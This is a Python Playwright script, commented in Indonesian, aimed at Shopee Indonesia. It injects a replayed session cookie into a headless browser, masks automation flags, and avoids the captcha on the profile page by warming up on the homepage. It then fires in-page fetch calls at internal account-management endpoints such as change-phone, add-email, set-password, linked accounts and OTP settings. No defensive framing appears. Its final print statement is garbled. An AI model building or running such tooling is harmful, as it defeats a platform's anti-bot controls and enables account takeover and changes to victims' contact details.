# -*- coding: utf-8 -*-
"""
dig3.py — LOGIN SUDAH TERBUKTI. Blocker = captcha di halaman /user/account/profile.

Strategi: jangan buka /user/account/profile (kena captcha). Warm di homepage
yang LOLOS, lalu panggil endpoint phone/email LANGSUNG via page.evaluate fetch
(SFU sudah aktif di homepage → signing otomatis).
"""
from __future__ import annotations

import json
import secrets
import sys
import time
from pathlib import Path

from playwright.sync_api import sync_playwright

HOME = "https://shopee.co.id/"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")

FETCH_JS = r"""
async (a) => {
  const m = document.cookie.match(/(^| )csrftoken=([^;]+)/);
  const csrf = m ? m[2] : '';
  const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
                  .map(b => b.toString(16).padStart(2,'0')).join('');
  const h = {
    'Content-Type':'application/json',
    'Accept':'application/json',
    'x-api-source':'pc',
    'x-requested-with':'XMLHttpRequest',
    'x-shopee-language':'id',
    'af-ac-enc-dat': hex,
  };
  if (csrf) h['x-csrftoken'] = csrf;
  try {
    const r = await fetch(a.url, {method:a.method||'GET', headers:h,
      credentials:'include', body:a.body?JSON.stringify(a.body):undefined});
    const t = await r.text();
    return {s:r.status, n:t.length, b:t.slice(0,2500)};
  } catch(e) { return {s:0,n:0,b:'EXC: '+String(e)}; }
}
"""


def parse_cookie(raw):
    out = {}
    for seg in raw.replace("\n", " ").split(";"):
        seg = seg.strip()
        if seg and "=" in seg:
            k, v = seg.split("=", 1)
            out[k.strip()] = v
    return out


ENDPOINTS = [
    ("account_info", "GET", "/api/v4/account/basic/get_account_info", None),
    ("profile", "GET", "/api/v4/account/get_profile", None),
    ("phone_validation", "GET", "/api/v4/account/basic/get_phone_validation_list", None),
    ("linked_accounts", "GET", "/api/v4/account/get_linked_accounts", None),
    ("change_init", "POST", "/api/v4/account/management/change_phone_init", {}),
    ("change_init_v2", "POST", "/api/v4/account/management/change_phone_init_v2", {}),
    ("add_phone_init", "POST", "/api/v4/account/management/add_phone_init", {"phone": "6281234567890"}),
    ("add_phone_init_self", "POST", "/api/v4/account/management/add_phone_init", {"phone": "6281234567890"}),
    ("email_init", "POST", "/api/v4/account/management/change_email_init", {}),
    ("email_add_init", "POST", "/api/v4/account/management/add_email_init", {}),
    ("set_password_init", "POST", "/api/v4/account/management/set_password_init", {}),
    ("check_unbind_phone", "POST", "/api/v4/account/management/check_unbind_phone", {"phone": "6281234567890"}),
    ("otp_settings", "POST", "/api/v4/otp/get_settings_v2",
     {"phone": "6281234567890", "operation": 0, "channel": 1}),
]


def main():
    jar = parse_cookie(open(sys.argv[1]).read().strip())
    out = Path("/root/shopee-verify/direct_api.jsonl")
    fh = out.open("w")

    with sync_playwright() as pw:
        b = pw.chromium.launch(headless=True, args=[
            "--no-sandbox", "--disable-dev-shm-usage",
            "--disable-blink-features=AutomationControlled"])
        ctx = b.new_context(user_agent=UA, locale="id-ID",
                            viewport={"width": 1366, "height": 900},
                            timezone_id="Asia/Jakarta")
        page = ctx.new_page()

        objs = [{"name": k, "value": v, "domain": ".shopee.co.id", "path": "/",
                 "secure": True, "sameSite": "None"} for k, v in jar.items()]
        try:
            ctx.add_cookies(objs)
        except Exception:
            pass
        cdp = ctx.new_cdp_session(page)
        cdp.send("Network.enable")
        for k, v in jar.items():
            try:
                cdp.send("Network.setCookie", {"name": k, "value": v,
                                               "domain": ".shopee.co.id", "path": "/",
                                               "secure": True, "httpOnly": False})
            except Exception:
                pass

        print("[warm] homepage (jangan profile)")
        page.goto(HOME, wait_until="domcontentloaded", timeout=60000)
        page.wait_for_timeout(7000)

        url = page.url
        print(f"  landed: {url[:95]}")
        if "verify" in url or "login" in url:
            print("[!] homepage pun kena verify. Coba tunggu & reload.")
            page.wait_for_timeout(15000)
            page.goto(HOME, wait_until="domcontentloaded", timeout=60000)
            page.wait_for_timeout(6000)
            print(f"  retry landed: {page.url[:95]}")

        # pastikan SDK termuat
        sdk = page.evaluate("""() => {
            return {fetch: typeof window.fetch, sfu: !!window.__SHOPEE_SFU__,
                    hasFetchHook: !!(window.fetch && window.fetch.toString().length > 100)};
        }""")
        print(f"  sdk: {sdk}")

        print("\n[probe endpoint langsung dari halaman]\n")
        for name, method, path, body in ENDPOINTS:
            res = page.evaluate(FETCH_JS, {"url": path, "method": method, "body": body})
            fh.write(json.dumps({"name": name, "path": path, "method": method,
                                 "status": res["s"], "resp": res["b"]},
                                ensure_ascii=False) + "\n")
            fh.flush()
            print(f"  [{name:22}] HTTP {res['s']:3} len={res['n']:5}")
            print(f"    {res['b'][:230]}")
            print()

        edge = {
            "userid": jar.get("SPC_U"),
        }
        print(f"[identitas] SPC_X=REDACTED'userid']}")
        b.close()
    fh.close()
    print(f"\n[+] {out}")


if __name__ == "__main__":
    main()
